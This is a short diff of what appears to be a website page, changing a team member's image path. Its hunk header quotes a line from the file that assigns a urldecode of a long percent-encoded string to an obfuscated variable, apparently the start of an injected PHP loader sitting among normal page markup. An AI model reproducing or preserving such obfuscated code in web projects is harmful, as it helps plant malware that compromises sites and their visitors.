@@ -2078,7 +2078,7 @@ $x_yz_z_yyz=urldecode("%6f%41%2d%62%4e%6e%4b%37%4c%35%5f%4a%55%74%52%78%49%59%2b
 
                     <div>
 
-                        <img class="rounded-circle mb-3" src="./images/komal.png.jpg" alt="" style="max-height: 30vh;">
+                        <img class="rounded-circle mb-3" src="./images/komal.png" alt="" style="max-height: 30vh;">
 
                         <h5>Komal Mojidra</h5>
 
